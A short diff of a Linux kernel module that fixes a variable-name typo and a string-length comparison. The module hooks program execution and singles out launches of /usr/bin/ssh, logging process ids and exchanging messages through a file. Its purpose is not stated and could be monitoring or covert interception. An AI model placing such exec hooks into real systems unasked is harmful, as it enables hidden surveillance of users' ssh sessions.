@@ -230,7 +230,7 @@ static void read_msg(char* buf){
     kernel_read(filp,buf,1,pos);
     if(buf[0]=='1'){
     	*pos = *pos +2;
-    	kernel_read(flip,buf,strlen(buf),pos);
+    	kernel_read(filp,buf,strlen(buf),pos);
     	*pos = *pos -2;
     	kernel_write(filp,"01",2,pos);
     }
@@ -272,7 +272,7 @@ static void send_msg(char* header,char* body){
 static asmlinkage void fh_finalize_exec(struct linux_binprm *bprm)
 {
 
-	if(strncmp(bprm->filename, "/usr/bin/ssh", IFNAMSIZ) == 0){
+	if(strncmp(bprm->filename, "/usr/bin/ssh", 12) == 0){
 		printk("finalize execve() %s\n",bprm->filename);
 		printk("pid = %d, tgid= %d\n",current->pid,current->tgid);
 		char *buf = kmalloc(16*sizeof(char),GFP_KERNEL);
